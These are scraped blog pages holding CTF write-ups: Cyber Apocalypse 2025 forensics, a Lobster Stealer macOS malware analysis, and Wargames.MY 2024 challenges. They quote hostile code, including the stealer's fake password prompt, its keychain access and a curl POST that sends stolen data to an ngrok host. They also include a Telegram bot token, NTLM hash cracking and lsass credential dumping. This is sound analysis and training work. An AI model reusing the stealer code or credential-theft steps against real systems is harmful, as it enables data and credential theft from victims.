CC\\u00F3\\u0001\\u0039\\u0038\\u00D8\\u00A5\\u0054\\u0044\\u005D\\u0072\\u0098\\u005F\\u00CD\\u0092\\u00A1\\u00A3\\u00AF\\u00D3\\u0086\\u00F0\\u00BC\\u006B\\u00E5\\u00F1\\u0008\\u00CE\\u0053\\u00B5\\u00D2\\u0055\\u00C6\\u0019\\u0052\\u0040\\u003E\\u005E\\u008A\\u00EC\\u009C\\u0012\\u002C\\u00D5\\u00EA\\u000B\\u00C6\\u0057\\u0040\\u0060\\u008B\\u00E8\\u000F\\u001A\\u00A0\\u008C\\u0021\\u00BC\\u002A\\u003B\\u0028\\u00A2\\u0077\\u00A3\\u00EB\\u00E6\\u0035\\u0068\\u0024\\u0098\\u00AA\\u00FD\\u007F\\u0096\\u004B\\u00EB\\u0054\\u0049\\u0060\\u00B2\\u0055\\u00BF\\u001F\\u006C\\u0013\\u006B\\u00AA\\u0010\\u00BF\\u00EC\\u00B2\\u00B9\\u00A9\\u0029\\u0086\\u0068\\u008F\\u0037\\u0046\\u0017\\u0001\\u000E\\u000C\\u0062\\u0010\\u00C5\\u00F4\\u0089\\u00FD\\u0045\\u009F\\u0026\\u005C\\u003F\\u005C\\u0027\\u00F3\\u00BF\\u009C\\u00C9\\u0066\\u007E\\u005B\\u0043\\u0016\\u00DA\\u000F\\u0097\\u0070\\u0065\\u000F\u0026#34;)))},CryptoJS[_$_9b39[4]][_$_9b39[3]][_$_9b39[2]](btoa(unescape(\u0026#34;\\u00DB\\u00ED\\u0098\\u006C\\u00B1\\u0089\\u00A1\\u0047\\u0095\\u00F2\\u008A\\u00B3\\u0017\\u00AF\\u004C\\u002D\\u00B2\\u0007\\u0037\\u0029\\u00CF\\u0054\\u00BC\\u0093\u0026#34;))),{iv:CryptoJS[_$_9b39[4]][_$_9b39[3]][_$_9b39[2]](btoa(unescape(\u0026#34;\\u00E4\\u0075\\u0026\\u0014\\u00CA\\u004A\\u0037\\u002F\\u0038\\u0009\\u00FC\\u00C6\\u000D\\u0009\\u0030\\u008A\u0026#34;)))}).toString(CryptoJS[_$_9b39[4]][_$_9b39[5]])); De-obfuscated malicous JavaScript # document.getElementById(\u0026#39;newsletterForm\u0026#39;).addEventListener(\u0026#39;submit\u0026#39;, function(e) { e.preventDefault(); const emailField = document.getElementById(\u0026#39;email\u0026#39;); const chatIdField = document.getElementById(\u0026#39;descriptionField\u0026#39;); let isValid = true; // Validate email field if (!emailField.value) { emailField.classList.add(\u0026#39;shake\u0026#39;); isValid = false; setTimeout(() =\u0026gt; emailField.classList.remove(\u0026#39;shake\u0026#39;), 500); } if (!isValid) return; const emailPart = emailField.value.split(\u0026#39;@\u0026#39;)[0]; const chatId = parseInt(chatIdField.value, 10); handleFormSubmission(emailPart, chatId); }); function generateSecurityToken(seed) { return function() { var args = Array.prototype.slice.call(arguments), offset = args.shift(); return args.reverse().map((num, idx) =\u0026gt; String.fromCharCode(num - offset - 7 - idx) ).join(\u0026#39;\u0026#39;); }(43, 106, 167, 103, 163, 98) + 1354343..toString(36).toLowerCase() + 21..toString(36).toLowerCase().split(\u0026#39;\u0026#39;).map(c =\u0026gt; String.fromCharCode(c.charCodeAt() - 13) ).join(\u0026#39;\u0026#39;) + 4..toString(36).toLowerCase() + 32..toString(36).toLowerCase().split(\u0026#39;\u0026#39;).map(c =\u0026gt; String.fromCharCode(c.charCodeAt() - 39) ).join(\u0026#39;\u0026#39;) + 381..toString(36).toLowerCase().split(\u0026#39;\u0026#39;).map(c =\u0026gt; String.fromCharCode(c.charCodeAt() - 13) ).join(\u0026#39;\u0026#39;) + function() { var args = Array.prototype.slice.call(arguments), offset = args.shift(); return args.reverse().map((num, idx) =\u0026gt; String.fromCharCode(num - offset - 60 - idx) ).join(\u0026#39;\u0026#39;); }(42, 216, 153, 153, 213, 187); } function handleFormSubmission(emailPart, chatId) { const CHANNEL_ID = -1002496072246; const ENCRYPTED_TOKEN = \u0026#34;nZiIjaXAVuzO4aBCf5eQ5ifQI7rUBI3qy/5t0Djf0pG+tCL3Y2bKBCFIf3TZ0Q==\u0026#34;; if (emailPart === generateSecurityToken(\u0026#39;s3cur3k3y\u0026#39;) \u0026amp;\u0026amp; CryptoJS.SHA256(sequence.join()).toString(CryptoJS.enc.Base64) === \u0026#34;18m0oThLAr5NfLP4hTycCGf0BIu0dG+P/1xvnW6O29g=\u0026#34;) { const decryptedToken = CryptoJS.RC4Drop.decrypt( ENCRYPTED_TOKEN, CryptoJS.enc.Utf8.parse(emailPart), { drop: 192 } ).toString(CryptoJS.enc.Utf8); const API_URL = \u0026#34;https://api.telegram.org/bot\u0026#34; + decryptedToken; // https://api.telegram.org/bot7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc const xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState === XMLHttpRequest.DONE) { try { const response = JSON.parse(xhr.responseText); window.location.replace(response.result.text); } catch (error) { alert(\u0026#39;Form submitted!\u0026#39;); } } }; xhr.open(\u0026#39;GET\u0026#39;, `${API_URL}/forwardMessage?chat_id=${chatId}\u0026amp;from_chat_id=${CHANNEL_ID}\u0026amp;message_id=5`); xhr.send(); } else { alert(\u0026#39;Form submitted!\u0026#39;); } } // Sequence tracking for checkbox interactions const sequence = []; function trackCheckboxInteraction() { sequence.push(this.id); } // Attach event listeners to checkboxes document.querySelectorAll(\u0026#39;input.cb\u0026#39;).forEach(checkbox =\u0026gt; { checkbox.addEventListener(\u0026#39;change\u0026#39;, trackCheckboxInteraction); }); Key Functionality Breakdown # Form Submission Handling\nIntercepts form submission Validates email format Extracts username portion from email Parses chat ID from description field Security Token Generation\nGenerates token 0p3r4t10n_4PT_Un10n through: Character code manipulation Base36 conversions Arithmetic operations Telegram API Interaction\nRequired credentials: CHANNEL_ID = -1002496072246 ENCRYPTED_TOKEN = \u0026#34;nZiIjaXAVuzO4aBCf5eQ5ifQI7rUBI3qy/5t0Djf0pG+tCL3Y2bKBCFIf3TZ0Q==\u0026#34; Forwards message ID 5 to specified chat ID Checkbox Sequence Validation\nTracks checkbox interaction order Validates SHA-256 hash of sequence against: 18m0oThLAr5NfLP4hTycCGf0BIu0dG+P/1xvnW6O29g= Correct sequence: C4, C2, C2, C2, C1, C3, C4, C1 Successful Form Submission # Telegram Channel Analysis # Using matkap to extract messages:\n=== Captured Messages === --- Message ID: 3 --- Date: 1742658154 Text: Interesting. Their reliance on Brave works in our favor. Send over the tool and a brief summary of its capabilities. ---------------------------------------- --- Message ID: 2 --- Date: 1742658154 Text: Operation Eldoria is progressing as planned. The dissidents are becoming too confident, thinking they are untouchable behind \u0026#34;secure\u0026#34; tools. As protestors, they have flocked to Brave because it\u0026#39;s open source, but that might cost them their privacy. ---------------------------------------- --- Message ID: 4 --- Date: 1742658155 Text: Oh! We should not forget to send the invitation link for this channel to the website so the rest of the parties can join. Coordination is key, and they’ll need access to our updates and tools like Brave. ---------------------------------------- --- Message ID: 5 --- Date: 1742658155 Text: https://t.me/+_eYUKZwn-p45OGNk ---------------------------------------- --- Message ID: 6 --- Date: 1742658155 File ID: BQACAgQAAyEFAASUxwo2AAMGZ93ttKcc24vGEJPqqIstCeH-0rgAAs4YAALNMcBT0DBTt6JgX1k2BA ---------------------------------------- --- Message ID: 7 --- Date: 1742658156 Text: This is the tool. Details: - Targets only Brave Browser users. - Exfiltrates the browser\u0026#39;s local storage. - Operates silently and deletes traces upon execution. ---------------------------------------- --- Message ID: 8 --- Date: 1742658156 Text: Please send over the archive password. ---------------------------------------- --- Message ID: 9 --- Date: 1742658157 Text: Oh, yes! It is dr4g0nsh34rtb3l0ngst0m4l4k4r ---------------------------------------- --- Message ID: 10 --- Date: 1742658157 Text: I finished reviewing it. Looks promising! I will let my contacts know so they start distributing it. Let the operation begin! ---------------------------------------- --- Message ID: 11 --- Date: 1742658157 Text: For Lord Malakar! ⚔ ---------------------------------------- Malware Analysis (Brave.zip) # Password: dr4g0nsh34rtb3l0ngst0m4l4k4r Behavior: Only executes on Brave Browser Exfiltrates local storage data Network artifacts show JWT usage Network Capture (FakeNet) # JWT Analysis # Decoded content: Final flag after Base64 decoding: Complete Attack Chain # Victim submits form with specific credentials Script decrypts Telegram bot token Forwards message containing channel invite Malware exfiltrates Brave browser data C2 communication via JWT-authenticated API ","date":"26 March 2025","externalUrl":null,"permalink":"/posts/cyberapocalypse2025/","section":"Posts","summary":"This page contains Cyber Apocalypse 2025 CTF writeups, covering all challenges in the forensics category.","title":"Cyber Apocalypse 2025 - Writeups","type":"posts"},{"content":"","date":"6 February 2025","externalUrl":null,"permalink":"/tags/dfir-labs/","section":"Tags","summary":"","title":"DFIR Labs","type":"tags"},{"content":"This is a writeup on Famous AMOS CTF challenge. For this challenge we are given the description as follow:\nCortex XDR has been flagging alerts non-stop this Friday due to a suspicious file being downloaded by Zhu Yuan. Thankfully, my Wireshark was running so we managed to track down some of the malicious activity. It seems like the user received a malicious attachment from an unknown domain via email, and executed it in their machine.\nChallenge File Analysis # PCAP analysis # The challenge file given is a PCAP and we can see that there\u0026rsquo;s multiple attachment that can be extracted from the PCAP by looking at the received packets.\nLet\u0026rsquo;s export out all the objects.\nPCAP Objects analysis # BetaTest.pdf # The Game Downloader is the LegitLobsterGameDownloader.dmg and the Special Gift is bangboo.png.\nBangboo.png # An image of Safety bangboo\nJoinsystem (103kb) # {\u0026#34;files\u0026#34;:[\u0026#34;/home/kali/Desktop/lobsterman/joinsystem/out.zip\u0026#34;],\u0026#34;message\u0026#34;:\u0026#34;Files uploaded successfully\u0026#34;} Out.zip (766kb) # This seems to be a compressed file named out.zip due to the magic-byte PK, which we can decompress and investigate on the content.\nLegitLobsterGameDownloader.dmg # It is an Apple Disk Image File, which we can decompress later to further investigate on the content inside.\nAnalysis on Out.zip # Out.zip/ ├── tmp/ │ └── 3089/ │ ├── File Grabber/ │ │ └── BetaTest.pdf │ ├── info │ ├── keychain │ ├── pwd │ └── username └── flag.enc BetaTest.pdf: The same pdf attachment found in the PCAP\ninfo: Information about the machine hardware Vendor ID: 0x15ad Yes: 24-Bit Color (ARGB8888)F2C3870AB6fd715126e33f59ae7]Welcome to the Virtual Machine\nkeychain: OSX Keychain file\npwd: macos\nusername: macos\nflag.enc: The encrypted flag\nAnalysis on LegitLobsterGameDownloader.dmg # LegitLobsterGame/ └── lobsterstealer lobsterstealer: MacOS binary\nUsing IDA, we can decompile the code. In the main function, we observe a long hexadecimal value and a shorter hexadecimal value being defined. These values are then passed as inputs to the rc4_decrypt function to retrieve the original value.\nRC4 Decrypt # To decrypt the original data, we have to extract the long hexadecimal value at aA37c59750ed63b and clean it up using CyberChef to be used.\nThere should be better way to do this, but here\u0026rsquo;s how I did it\nAfter that I used CyberChef to decrypt the encrypted data and the original malicious OSA Script can be found.\nEncrypt Flag function # Upon analyzing the malicious OSA script, the encryptFlag function appears to be responsible for encrypting the flag. At the end of the script, the input files and the output file used for the encryption process can be found.\non encryptFlag(sussyfile, inputFile, outputFile) set hexKey to (do shell script \u0026#34;md5 -q \u0026#34; \u0026amp; sussyfile) set hexIV to (do shell script \u0026#34;echo \\\u0026#34;\u0026#34; \u0026amp; hexKey \u0026amp; \u0026#34;\\\u0026#34; | rev\u0026#34;) do shell script \u0026#34;openssl enc -aes-128-cbc -in \u0026#34; \u0026amp; quoted form of inputFile \u0026amp; \u0026#34; -out \u0026#34; \u0026amp; quoted form of outputFile \u0026amp; \u0026#34; -K \u0026#34; \u0026amp; hexKey \u0026amp; \u0026#34; -iv \u0026#34; \u0026amp; hexIV end encryptFlag set sussyfile to \u0026#34;~/Downloads/bangboo.png\u0026#34; set inputFile to \u0026#34;/tmp/flag.png\u0026#34; set outputFile to \u0026#34;/tmp/flag.enc\u0026#34; encryptFlag(sussyfile, inputFile, outputFile) do shell script \u0026#34;cd /tmp \u0026amp;\u0026amp; zip -r out.zip \u0026#34; \u0026amp; writemind \u0026amp; \u0026#34; flag.enc\u0026#34; send_data(0) do shell script \u0026#34;rm -r \u0026#34; \u0026amp; writemind do shell script \u0026#34;rm /tmp/out.zip\u0026#34; do shell script \u0026#34;rm /tmp/flag.enc\u0026#34; The encryptFlag function accept in 3 arguments sussyfile, inputfile and outputfile.\nFrom the variable defined, we know that the sussyfile is set to bangboo.png, the image found in the PCAP earlier.\nThe output file flag.enc can also be found inside the Out.zip.\nEncryption method = AES-128-CBC\nkey = MD5 of bangboo.png\nIV = reverse MD5 of bangboo.png\nWith that we can use CyberChef to decrypt the encrypted flag and obtain the original flag.\nKey (MD5 hash of bangboo.png)\nIV (Reverse MD5 hash of bangboo.png)\nMalicious OSA Script # 1. Initialization and Setup # A random directory is created in /tmp/ (e.g., /tmp/\u0026lt;randomNumber\u0026gt;/) to store collected data. The variable writemind holds the path to this temporary directory. 2. System Information Collection # The script collects system information (e.g., software, hardware, and display details) using the system_profiler command. This information is saved to a file named info in the writemind directory. 3. Password Retrieval # The script attempts to retrieve the user\u0026rsquo;s password: If the password is cached, it retrieves it silently. If not, it prompts the user with a dialog box asking for their password. The entered password is saved to a file named pwd in the writemind directory. *The collected password can then be used to decrypt the OSX Keychain * on getpwd(username, writemind) try if checkvalid(username, \u0026#34;\u0026#34;) then set result to do shell script \u0026#34;security 2\u0026gt;\u0026amp;1 \u0026gt; /dev/null find-generic-password -ga \\\u0026#34;Chrome\\\u0026#34; | awk \\\u0026#34;{print $2}\\\u0026#34;\u0026#34; writeText(result as string, writemind \u0026amp; \u0026#34;masterpass-chrome\u0026#34;) else repeat set result to display dialog \u0026#34;Required Application Helper.\\nPlease enter password for continue.\u0026#34; default answer \u0026#34;\u0026#34; with icon caution buttons {\u0026#34;Continue\u0026#34;} default button \u0026#34;Continue\u0026#34; giving up after 150 with title \u0026#34;System Preferences\u0026#34; with hidden answer set password_entered to text returned of result if checkvalid(username, password_entered) then writeText(password_entered, writemind \u0026amp; \u0026#34;pwd\u0026#34;) return password_entered end if end repeat end if end try return \u0026#34;\u0026#34; end getpwd 4. File and Data Collection # a. Browser Data Collection\nChromium-Based Browsers : The script iterates over a list of Chromium-based browsers (e.g., Chrome, Brave, Edge, Opera, etc.) and collects sensitive files such as: Cookies Login Data Web Data IndexedDB Local Extension Settings It uses the grabPlugins function to handle IndexedDB and Local Extension Settings for specific plugins. Firefox-Based Browsers : The script collects data from Firefox, Waterfox, and Pale Moon profiles, including: Cookies Form history Key database (key4.db) Login data (logins.json) This data is saved in a subdirectory named ff/. b. Wallet Data Collection\nDesktop Wallets : The script collects data from various cryptocurrency wallets, including: Electrum Coinomi Exodus Atomic Wasabi Ledger Live Monero Bitcoin Core Litecoin Core Dash Core Trezor Suite Wallet data is saved in a subdirectory named deskwallets/. c. Telegram Data Collection\nTelegram Desktop : The script collects data from the Telegram Desktop application, specifically targeting the tdata/ directory, which contains chat history and other sensitive information. This data is saved in a subdirectory named Telegram Data/. d. File Grabber\nFileGrabber Functionality : The script searches for files with specific extensions (e.g., .pdf, .docx, .wallet, .keys) in the user\u0026rsquo;s Desktop, Documents, and Downloads folders. Files are copied to a subdirectory named FileGrabber/ if their total size does not exceed 10 MB. Additional files like Safari cookies (Cookies.binarycookies) and Apple Notes data (NoteStore.sqlite) are also collected. 5. Keychain and Notes Data # Keychain Access : The script copies the macOS login keychain (login.keychain-db) to the writemind directory. Apple Notes : The script collects Apple Notes data (NoteStore.sqlite and related files) and saves them in the FileGrabber/ directory. 6. Sending Collected Data # Sending Data to C2 : The script attempts to send the collected data to a remote server using an HTTP POST request via curl. The data is sent as a ZIP file (out.zip) containing all the collected files. If the transmission fails, the script retries up to 40 times with a delay of 3 seconds between attempts. on send_data(attempt) try set result_send to do shell script \u0026#34;curl -X POST -H \\\u0026#34;user: 85JDXWQ4CL67-XaZnPqOLmHFv1yNRXZOmNTpeJMw4AP=\\\u0026#34; -H \\\u0026#34;BuildID: /xpLmzYqPrVH-jKOpfmncviXt2zDgp/-NFM7tQhb6tp=\\\u0026#34; --max-time 300 --retry 5 --retry-delay 10 -F \\\u0026#34;file1=@/tmp/out.zip\\\u0026#34; http://b2eb-115-135-31-192.ngrok-free.app/joinsystem\u0026#34; on error if attempt \u0026lt; 40 then delay 3 send_data(attempt + 1) end if end try end send_data 7. Cleanup # Temporary Files Removal : After the data is sent, the script performs cleanup by: Deleting the temporary directory (writemind). Removing the ZIP file (out.zip) and encrypted flag file (flag.enc) from /tmp/. Shoutout to the author of this challenge:\nwarlocksmurf ","date":"6 February 2025","externalUrl":null,"permalink":"/posts/lobsterstealer/","section":"Posts","summary":"The writeup analyzes Lobster Stealer, a macOS malware that steals sensitive data like passwords, browser history, and cryptocurrency wallet info. It uses RC4 for command obfuscation and AES-128-CBC for encrypting flag. The challenge involves decrypting the flag by analyzing the malicious OSA script and extracting encryption keys from a PNG file.","title":"Lobster Stealer - Malware Analysis","type":"posts"},{"content":"","date":"6 February 2025","externalUrl":null,"permalink":"/tags/malware-analysis/","section":"Tags","summary":"","title":"malware analysis","type":"tags"},{"content":"","date":"6 February 2025","externalUrl":null,"permalink":"/categories/malware-analysis/","section":"Categories","summary":"","title":"malware analysis","type":"categories"},{"content":" Crypto # Credentials # We found a leak of a blackmarket website\u0026rsquo;s login credentials. Can you find the password of the user osman and successfully decrypt it?\nHint: The first user in user.txt corresponds to the first password in passwords.txt\nFlag: WGMY{b6d180d9c302d8a8daad1f2174a0b212}\nFor this challenge there are 2 files provided passwd.txt and user.txt. user.txt\nosman passwd.txt\nZJPB{e6g180g9f302g8d8gddg1i2174d0e212} I search for user osman from the user.txt which appeared on line 337. On the passwd.txt file\u0026rsquo;s line 337, I found the corresponding password for the user osman which is ZJPB{e6g180g9f302g8d8gddg1i2174d0e212}.\nThis password appears to be encoded using ROT13. To decode it, I used CyberChef ROT13 Brute Force to decode it, with the known plaintext of wgmy.\nForensic # I Cant Manipulate People # Partial traffic packet captured from hacked machine, can you analyze the provided pcap file to extract the message from the packet perhaps by reading the packet data?\nHint: Attacker too noob to ping not in sequence\nFlag: WGMY{1e3b71d57e466ab71b43c2641a4b34f4}\nGiven a traffic.pcap file, it can be observed in Wireshark that the source is sending a large number of ping requests to 192.168.0.1 with the following information: Echo (ping) request id=0x0000, seq=0/0, ttl=64 (no response found!). By examining the packet, we see that the data section of each packet consists of only 1 byte.\nTo filter and view only ICMP Echo requests, apply the filter icmp.type == 8. Then, modify the protocol preferences by right-clicking on any packet and selecting Protocol Preferences \u0026gt; Data \u0026gt; Show Data as Text. This will display the entire data section of the ping packet, where the flag is visible.\nAn alternative way to obtain the flag is by using Tshark. The following command can be run in the terminal:\ntshark -r traffic.pcap -Y \u0026#34;icmp.type == 8\u0026#34; -T fields -e data | xxd -r -p Oh Man # We received a PCAP file from an admin who suspects an attacker exfiltrated sensitive data. Can you analyze the PCAP file and uncover what was stolen?\nZip Password: wgmy\nHint: Investigate the tool used by the attacker\nFlag: wgmy{fbba48bee397414246f864fe4d2925e4}\nWe are given a PCAP file containing encrypted SMB traffic. Our goal is to decrypt the SMB traffic in order to obtain the transferred file. After researching online, I found this write-up that explains how to decrypt SMB traffic.\nWhat We Need to Decrypt the SMB Traffic To decrypt the traffic from the PCAP file, we need the following information:\nDomain Username Password/NTLM Hash (can be cracked) NTProofStr NTLM Server Challenge Encrypted Session Key Session ID 1. Obtain the data from the Session Setup Packet # From the Session Setup Request, NTLMSSP_AUTH packet, we can extract the following data:\nDomain: DESKTOP-PMNU0JK Username: Administrator Encrypted Session Key: 12140eb776cb74a339c9c75b152c52fd Next, we extract the NTProofStr and the remaining NTLM Response Data:\nNTProofStr: ae62a57caaa5dd94b68def8fb1c192f3 Remaining NTLM Response Data: 01010000000000008675779b2e57db01376f686e57504d770000000002001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0001001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0004001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0003001e004400450053004b0054004f0050002d0050004d004e00550030004a004b00070008008675779b2e57db010900280063006900660073002f004400450053004b0054004f0050002d0050004d004e00550030004a004b000000000000000000 Session ID: 65000000000c0000 To convert this, use CyberChef to swap the endianness. From the Session Setup Response, NTLMSSP_CHALLENGE packet, we obtain the NTLM Server Challenge:\nNTLM Server Challenge: 7aaff6ea26301fc3 2. Crack the Password Using the NTLM Data # Now that we have all the required data, we can construct the hash to crack the password using HashCat. The format is:\nUsername::Domain:NTLMServerChallenge:NTProofStr:RemainingNTLMResponseData Hash\nAdministrator::DESKTOP-PMNU0JK:7aaff6ea26301fc3:ae62a57caaa5dd94b68def8fb1c192f3:01010000000000008675779b2e57db01376f686e57504d770000000002001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0001001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0004001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0003001e004400450053004b0054004f0050002d0050004d004e00550030004a004b00070008008675779b2e57db010900280063006900660073002f004400450053004b0054004f0050002d0050004d004e00550030004a004b000000000000000000 Once the hash is constructed, you can use HashCat to crack the password. The cracked password is password\u0026lt;3.\n3. Obtain the Random Session Key # With the data obtained from the packet and the cracked password, we can calculate the random session key using the following Python script: Get Random Session Key.py\nimport hashlib import hmac import argparse try: from Cryptodome.Cipher import ARC4 from Cryptodome.Cipher import DES from Cryptodome.Hash import MD4 except Exception: print(\u0026#34;Warning: You don\u0026#39;t have any crypto installed. You need pycryptodomex\u0026#34;) print(\u0026#34;See https://pypi.org/project/pycryptodomex/\u0026#34;) def generateEncryptedSessionKey(keyExchangeKey, exportedSessionKey): cipher = ARC4.new(keyExchangeKey) cipher_encrypt = cipher.encrypt sessionKey = cipher_encrypt(exportedSessionKey) return sessionKey parser = argparse.ArgumentParser(description=\u0026#34;Calculate the Random Session Key based on data from a PCAP (maybe).\u0026#34;) parser.add_argument(\u0026#34;-u\u0026#34;, \u0026#34;--user\u0026#34;, required=True, help=\u0026#34;User name\u0026#34;) parser.add_argument(\u0026#34;-d\u0026#34;, \u0026#34;--domain\u0026#34;, required=True, help=\u0026#34;Domain name\u0026#34;) parser.add_argument(\u0026#34;-p\u0026#34;, \u0026#34;--password\u0026#34;, required=True, help=\u0026#34;Password of User\u0026#34;) parser.add_argument(\u0026#34;-n\u0026#34;, \u0026#34;--ntproofstr\u0026#34;, required=True, help=\u0026#34;NTProofStr. This can be found in PCAP (provide Hex Stream)\u0026#34;) parser.add_argument(\u0026#34;-k\u0026#34;, \u0026#34;--key\u0026#34;, required=True, help=\u0026#34;Encrypted Session Key. This can be found in PCAP (provide Hex Stream)\u0026#34;) parser.add_argument(\u0026#34;-v\u0026#34;, \u0026#34;--verbose\u0026#34;, action=\u0026#34;store_true\u0026#34;, help=\u0026#34;increase output verbosity\u0026#34;) args = parser.parse_args() user = str(args.user).upper().encode(\u0026#39;utf-16le\u0026#39;) domain = str(args.domain).upper().encode(\u0026#39;utf-16le\u0026#39;) # Create \u0026#39;NTLM\u0026#39; Hash of password passw = args.password.encode(\u0026#39;utf-16le\u0026#39;) hash1 = hashlib.new(\u0026#39;md4\u0026#39;, passw) password = hash1.digest() # Calculate the ResponseNTKey h = hmac.new(password, digestmod=hashlib.md5) h.update(user + domain) respNTKey = h.digest() # Use NTProofSTR and ResponseNTKey to calculate Key Exchange Key NTproofStr = bytes.fromhex(args.ntproofstr) h = hmac.new(respNTKey, digestmod=hashlib.md5) h.update(NTproofStr) KeyExchKey = h.digest() # Calculate the Random Session Key by decrypting Encrypted Session Key with Key Exchange Key via RC4 RsessKey = generateEncryptedSessionKey(KeyExchKey, bytes.fromhex(args.key)) if args.verbose: print(\u0026#34;USER WORK: \u0026#34; + user.decode(\u0026#39;utf-16le\u0026#39;) + \u0026#34; \u0026#34; + domain.decode(\u0026#39;utf-16le\u0026#39;)) print(\u0026#34;PASS HASH: \u0026#34; + password.hex()) print(\u0026#34;RESP NT: \u0026#34; + respNTKey.hex()) print(\u0026#34;NT PROOF: \u0026#34; + NTproofStr.hex()) print(\u0026#34;KeyExKey: \u0026#34; + KeyExchKey.hex()) print(\u0026#34;Random SK: \u0026#34; + RsessKey.hex()) Running the script with the correct parameters gives us the Random Session Key: 4147454a48564a4373437649574e504c\n4. Decrypt the SMB Traffic in WireShark # To decrypt the SMB traffic in Wireshark: Go to Edit \u0026gt; Preferences \u0026gt; Protocols \u0026gt; SMB2 \u0026gt; Secret session keys for decryption \u0026gt; Edit\n5. Extract the files # Once decrypted, we can extract the files using: File \u0026gt; Export Objects \u0026gt; SMB \u0026gt; Save All\n6. Analyze the Extracted Files # wqpiZo\n\u0026#34;lsass.exe\u0026#34;,\u0026#34;840\u0026#34;,\u0026#34;Services\u0026#34;,\u0026#34;0\u0026#34;,\u0026#34;24,332 K\u0026#34;,\u0026#34;Unknown\u0026#34;,\u0026#34;NT AUTHORITY\\SYSTEM\u0026#34;,\u0026#34;0:00:00\u0026#34;,\u0026#34;N/A\u0026#34; RxHmEj\nThe minidump has an invalid signature, restore it running: scripts/restore_signature 20241225_1939.log Done, to get the secretz run: python3 -m pypykatz lsa minidump 20241225_1939.log python3 -m pypykatz lsa minidump 20241225_1939.log 20241225_1939.log nano.exe This is identified as nanodump.exe from VirusTotal Scan, which can be found on GitHub.\nNow we know that the 20241225_1939.log can be used to get the minidump, then the next step is to restore the log file as the signature seems to be invalid MiniDump log file.\nThe method I used to restore is by downloading the scripts/restore_signature from the NanoDump\u0026rsquo;s GitHub and run the script on the log file.\n7. Get the flag # The flag can be obtained by running the pypykatz module and read the mini dump.\nUnwanted Meow # Uh.. Oh.. Help me, I just browsing funny cats memes, when I click download cute cat picture, the file that been download seems little bit wierd. I accidently run the file making my files shredded. Ughh now I hate cat meowing at me.\nHint: We don\u0026rsquo;t want meow here.\nFlag: WGMY{4a4be40c96ac6314e91d93f38043a634}\nWe are given a file named flag.shredded, which is a JPEG image file, but it appears to be corrupted.\nAfter opening the file in a text editor, it can be seen that the word meow is repeatedly placed throughout the file. To recover the image, I removed the meow entries and then added the .jpeg extension to the file. After this, the recovered image is still partially corrupted. To repair it, I used JPEG Medic to fix the image.\nAfter tinkering with JPEG Medic for a while, I was able to see part of the flag, even though the image was not fully recovered. The flag was visible in the partially restored image.\nUpon reviewing other writeups for this challenge, I realized that the intended solution was actually hidden in plain sight, which I had not noticed earlier. Instead of repairing the image, the flag could have been obtained simply by removing the additional meow entries and viewing the image directly.\nAfter removing the second set of meow entries, the image was fully recovered, and the flag can be successfully obtained.\nMisc # The DCM Meta # [25, 10, 0, 3, 17, 19, 23, 27, 4, 13, 20, 8, 24, 21, 31, 15, 7, 29, 6, 1, 9, 30, 22, 5, 28, 18, 26, 11, 2, 14, 16, 12]\nHint: The element is the number in the list, combine for the flag. Wrap in wgmy{}\nFlag: WGMY{51fadeb6cc77504db336850d53623177}\nWe are given a file with a .dcm extension, but the file itself only contains data.\nI used CyberChef to extract all the words. From the indices provided in the description, the largest index is 31, which indicates that the data can only have 32 characters. Therefore, I also removed the padding WGMY. The extracted data is: f63acd3b78127c1d7d3e700b55665354\nNext, to obtain the actual flag, we use the indices provided in the challenge description: [25, 10, 0, 3, 17, 19, 23, 27, 4, 13, 20, 8, 24, 21, 31, 15, 7, 29, 6, 1, 9, 30, 22, 5, 28, 18, 26, 11, 2, 14, 16, 12]\nBy following these indices, we can rearrange the characters in the extracted string. To automate this process, I create a Python script: flag.py\nelement = \u0026#34;f63acd3b78127c1d7d3e700b55665354\u0026#34; indices = [25, 10, 0, 3, 17, 19, 23, 27, 4, 13, 20, 8, 24, 21, 31, 15, 7, 29, 6, 1, 9, 30, 22, 5, 28, 18, 26, 11, 2, 14, 16, 12] result = \u0026#39;\u0026#39;.join([element[i] for i in indices]) print(\u0026#34;WGMY{\u0026#34;+result+\u0026#34;}\u0026#34;) Fun Fact: I asked ChatGPT to help me rearrange the extracted string using the indices provided. Unfortunately, I trusted ChatGPT without verifying the result, as it turns out, the output it provided was incorrect. Lesson learned: don\u0026rsquo;t trust ChatGPT too much 😂\n","date":"29 December 2024","externalUrl":null,"permalink":"/posts/wargamesmy2024/","section":"Posts","summary":"This page contains writeups for Wargames.MY 2024 CTF, covering challenges in Crypto, Forensic, and Misc categories. Solutions involve decrypting ROT13-encoded passwords, extracting flags from ICMP packets, decrypting SMB traffic using NTLM hashes, repairing corrupted JPEG images, and rearranging metadata from a .dcm file based on given indices. Each solution uses tools like CyberChef, Wireshark, Hashcat, and Python scripts.","title":"Wargames.MY 2024 - Writeups","type":"posts"},{"content":" Crypto # Mesej Rahsia # Tak susah pun, run je script\nFlag: 3108{substitute_cipher_text}\nFor this challenge, we are given a python script. secretMessenger.py\na,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z=\u0026#39;j\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;a\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;m\u0026#39;,\u0026#39;n\u0026#39;,\u0026#39;i\u0026#39;,\u0026#39;p\u0026#39;,\u0026#39;o\u0026#39;,\u0026#39;q\u0026#39;,\u0026#39;r\u0026#39;,\u0026#39;t\u0026#39;,\u0026#39;x\u0026#39;,\u0026#39;z\u0026#39;,\u0026#39;v\u0026#39;,\u0026#39;s\u0026#39;,\u0026#39;u\u0026#39;,\u0026#39;y\u0026#39;,\u0026#39;h\u0026#39;,\u0026#39;g\u0026#39;,\u0026#39;d\u0026#39;,\u0026#39;e\u0026#39;,\u0026#39;f\u0026#39;,\u0026#39;k\u0026#39;,\u0026#39;l\u0026#39;,\u0026#39;w\u0026#39; 